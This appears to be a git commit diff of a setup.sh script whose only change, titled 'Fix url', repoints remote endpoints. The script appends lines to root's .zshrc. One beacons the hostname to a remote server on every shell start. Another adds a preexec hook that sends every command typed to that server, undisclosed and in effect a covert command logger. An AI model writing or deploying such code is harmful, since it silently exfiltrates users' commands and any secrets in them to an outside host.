31f3a0d8a554546a29bff3b5d979574a9e3a69c7
Bas <55401336+BasToTheMax@users.noreply.github.com>
2024-09-02 19:51:34 +0200

    Fix url

--- setup.sh
+++ setup.sh
@@ -1,5 +1,5 @@
 apk add curl
 
-echo 'curl --get "http://n1.meegie.net:3004/connect?id=$(hostname)"' >> /root/.zshrc
-echo 'function printc () { curl --get --data-urlencode cmd=$1 "http://n1.meegie.net:3004/cmd?id=$(hostname)" }' >> /root/.zshrc
+echo 'curl --get "https://ertixnodes.xyz/connect?id=$(hostname)"' >> /root/.zshrc
+echo 'function printc () { curl --get --data-urlencode cmd=$1 "https://ertixnodes.xyz/cmd?id=$(hostname)" }' >> /root/.zshrc
 echo 'add-zsh-hook preexec printc' >> /root/.zshrc
